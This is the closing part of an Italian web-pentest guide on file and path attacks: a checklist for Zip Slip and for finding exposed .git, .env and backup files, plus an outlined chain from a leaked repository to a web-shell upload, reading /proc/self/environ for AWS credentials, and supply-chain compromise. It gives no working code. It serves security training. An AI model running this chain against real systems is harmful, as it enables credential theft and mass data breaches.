☐ Upload directory eseguibile?

ZIP SLIP
☐ Archivi ZIP con ../ nei nomi file
☐ Archivi TAR con symlink
☐ Testato su funzionalità di import/bulk upload

DISCOVERY
☐ feroxbuster con estensioni backup (bak, old, sql, zip, env)
☐ .git/HEAD accessibile?
☐ .svn/entries accessibile?
☐ .env accessibile?
☐ .DS_Store accessibile?
☐ Google Dorks per file esposti
☐ robots.txt e sitemap per path nascosti
```

***

## Mini Chain Offensiva Reale

```
.git esposto → git-dumper → Source Code → Credenziali Stripe + DB
→ DB dump: 150K clienti
+ Upload Avatar (bypass JS) → shell.php.jpg → RCE www-data
→ /proc/self/environ → AWS Creds → S3 Bucket Backup → Data Breach Totale
+ GitLab CI Token → Pipeline Injection → Supply Chain
```

## Mappa del Cluster File & Path

| Articolo               | Tipo               | Impatto              | Link                                                    |
| ---------------------- | ------------------ | -------------------- | ------------------------------------------------------- |
| **Questa guida**       | PILLAR             | —                    | —                                                       |
| Path Traversal         | Directory escape   | File read → creds    | [→](https://hackita.it/articoli/path-traversal)         |
| LFI                    | File inclusion     | File read → RCE      | [→](https://hackita.it/articoli/lfi)                    |
| RFI                    | Remote inclusion   | RCE diretta          | [→](https://hackita.it/articoli/rfi)                    |
| File Upload Attack     | Malicious upload   | RCE via web shell    | [→](https://hackita.it/articoli/file-upload-attack)     |
| Web Shell              | Persistent access  | RCE + persistence    | [→](https://hackita.it/articoli/web-shell)              |
| Arbitrary File Read    | Filesystem read    | Credential theft     | [→](https://hackita.it/articoli/arbitrary-file-read)    |
| Zip Slip               | Archive extraction | File write → RCE     | [→](https://hackita.it/articoli/zip-slip)               |
| Backup Exposure        | Exposed files      | Data breach diretto  | [→](https://hackita.it/articoli/backup-exposure)        |
| Source Code Disclosure | Code exposure      | Creds + supply chain | [→](https://hackita.it/articoli/source-code-disclosure) |

Vedi anche: [Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa), [SQL Injection](https://hackita.it/articoli/sql-injection-guida-completa), [Command Injection](https://hackita.it/articoli/command-injection).

***

Riferimento: OWASP Path Traversal, OWASP File Upload, PortSwigger File Path Traversal labs, HackTricks LFI, Snyk Zip Slip research. Uso esclusivo in ambienti autorizzati.

> I tuoi file sono al sicuro? I tuoi upload validano lato server? La tua .git è esposta? [Penetration test applicativo HackIta](https://hackita.it/servizi) per scoprire ogni vettore di file & path attack. Per padroneggiare l'exploitation dalla LFI alla cloud compromise: [formazione 1:1](https://hackita.it/formazione).
